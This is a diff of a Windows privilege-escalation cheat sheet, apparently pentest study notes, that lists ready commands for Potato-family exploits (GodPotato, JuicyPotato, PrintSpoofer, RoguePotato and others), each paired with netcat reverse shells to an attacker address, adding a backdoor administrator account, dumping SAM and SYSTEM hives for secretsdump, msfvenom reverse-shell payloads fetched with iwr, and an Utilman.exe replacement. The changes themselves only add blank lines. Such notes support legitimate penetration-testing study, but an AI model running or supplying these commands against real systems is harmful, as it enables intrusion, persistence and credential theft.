 DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2059,6 +2263,7 @@ DCOMPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2069,11 +2274,13 @@ DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /a
 
 ```bash
 EfsPotato.exe "C:\Windows\System32\cmd.exe"
+
 ```
 
 
 ```bash
 EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2083,6 +2290,7 @@ EfsPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2093,11 +2301,13 @@ EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /ad
 
 ```bash
 GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
+
 ```
 
 
 ```bash
 GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2107,6 +2317,7 @@ GodPotato.exe -cmd "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2117,11 +2328,13 @@ GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /
 
 ```bash
 HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"
+
 ```
 
 
 ```bash
 HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2131,6 +2344,7 @@ HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2141,11 +2355,13 @@ HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators em
 
 ```bash
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
+
 ```
 
 
 ```bash
 JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2155,6 +2371,7 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emm
 
 # Adds it as admin
 JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2165,11 +2382,13 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 
 ```bash
 PrintSpoofer.exe -c whoami
+
 ```
 
 
 ```bash
 PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2179,6 +2398,7 @@ PrintSpoofer.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2189,11 +2409,13 @@ PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma 
 
 ```bash
 RoguePotato.exe -r [ATTACKER_IP] -e whoami
+
 ```
 
 
 ```bash
 RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2203,6 +2425,7 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe user emma Passw
 
 # Adds it as admin
 RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2223,6 +2446,7 @@ SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"
 
 # Exemple
 SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "whoami | Set-Content C:\temp\w.log"
+
 ```
 
 
@@ -2230,6 +2454,7 @@ SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
 SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe"
 # Autre possibilité
 SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [port]"
+
 ```
 
 
@@ -2239,6 +2464,7 @@ SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "user emma Password123 /a
 
 # Ajoute l'utilisateur au groupe Administrateurs
 SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrators emma /add"
+
 ```
 
 
@@ -2249,11 +2475,13 @@ SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrator
 
 ```bash
 SigmaPotato.exe cmd.exe /c whoami
+
 ```
 
 
 ```bash
 SigmaPotato.exe --revshell [ATTACKER_IP] 4444
+
 ```
 
 
@@ -2263,6 +2491,7 @@ SigmaPotato.exe cmd.exe /c "net user emma Password123 /add"
 
 # Adds it as admin
 SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
+
 ```
 
 
@@ -2273,11 +2502,13 @@ SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
 
 ```bash
 SweetPotato.exe -a whoami
+
 ```
 
 
 ```bash
 SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2287,6 +2518,7 @@ SweetPotato.exe -a "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
 SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2317,6 +2549,7 @@ Microsoft Windows [Version 10.0.22621.1555]
 
 C:\Users\emma\Desktop> whoami
 nt authority\system
+
 ```
 
 
@@ -2331,11 +2564,13 @@ nt authority\system
 
 ```powershell
 JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
+
 ```
 
 
 ```powershell
 JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
+
 ```
 
 
@@ -2345,6 +2580,7 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emm
 
 # Adds it as admin
 JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2352,11 +2588,13 @@ JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgro
 
 ```powershell
 RoguePotato.exe -r [kali_ip] -e whoami
+
 ```
 
 
 ```powershell
 RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]"
+
 ```
 
 
@@ -2366,6 +2604,7 @@ RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe user emma Password1
 
 # Adds it as admin
 RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
+
 ```
 
 
@@ -2381,6 +2620,7 @@ RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administ
 ```powershell
 reg save hklm\sam c:\Temp\sam  
 reg save hklm\system c:\Temp\system
+
 ```
 
 
@@ -2388,6 +2628,7 @@ reg save hklm\system c:\Temp\system
 
 ```bash
 impacket-secretsdump -system system -sam sam local
+
 ```
 
 
@@ -2402,6 +2643,7 @@ impacket-secretsdump -system system -sam sam local
 
 ```powershell
 ps
+
 ```
 
 
@@ -2409,6 +2651,7 @@ ps
 
 ```powershell
 .\SeDebugPrivesc.exe <PID> <Program and Arguments>
+
 ```
 
 
@@ -2426,6 +2669,7 @@ ps
 
 ```text
 C:\
+
 ```
 
 
@@ -2447,11 +2691,13 @@ C:\
 
 ```powershell
 systeminfo
+
 ```
 
 
 ```powershell
 whoami /priv
+
 ```
 
 ![Checking for SeManageVolume privilege.](https://www.emmanuelsolis.com/img/semanage_1.png)
@@ -2465,6 +2711,7 @@ whoami /priv
 
 ```powershell
 .\SeManageVolumeExploit.exe
+
 ```
 
 ![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)
@@ -2474,6 +2721,7 @@ whoami /priv
 
 ```bash
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
+
 ```
 
 
@@ -2484,6 +2732,7 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port
 
 ```powershell
 iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
+
 ```
 
 ![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)
@@ -2496,11 +2745,13 @@ iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll
 
 ```powershell
 systeminfo
+
 ```
 
 
 ```powershell
 systeminfo
+
 ```
 
 ![Triggering the payload for a reverse shell.](https://www.emmanuelsolis.com/img/semanage_4.png)
@@ -2519,6 +2770,7 @@ systeminfo
 cd C:\Windows\system32
 
 ren Utilman.exe Utilman.old
+
 ```
 
 
@@ -2526,6 +2778,7 @@ ren Utilman.exe Utilman.old
 
 ```powershell
 ren cmd.exe Utilman.exe
+
 ```
 
 
@@ -2537,6 +2790,7 @@ Windows + L
 
 # Connectez-vous via RDP d'une manière qui demande des identifiants dans l'écran Windows
 rdesktop [ip]
+
 ```
 
 
@@ -2544,6 +2798,7 @@ rdesktop [ip]
 
 ```text
 nt authority\system
+
 ```
 
 
@@ -2552,6 +2807,7 @@ nt authority\system
 ```powershell
 # Once in the Windows Login Screen press
 Windows + U
+
 ```
 
 
@@ -2563,6 +2819,7 @@ Windows + U
 
 ```powershell
 iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
+
 ```
 
 
@@ -2575,6 +2832,7 @@ iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
 # (Option 2) Payload reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali_ip] LPORT=[port] -f exe -o payload.exe
 .\SeRestoreAbuse.exe C:\temp\payload.exe
+
 ```
 
 ---
